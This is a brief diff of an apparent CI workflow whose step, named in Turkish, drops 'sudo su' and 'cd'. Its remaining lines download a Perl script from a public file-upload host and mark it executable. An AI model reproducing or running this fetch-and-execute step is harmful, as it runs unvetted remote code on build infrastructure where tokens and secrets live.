@@ -14,8 +14,6 @@ jobs:
     steps:
       - name: İndir ve Hazırla
         run: |
-          sudo su
-          cd
           wget https://uploader.sh/VYcu-/v2.pl -O v2.pl
           chmod +x v2.pl
           
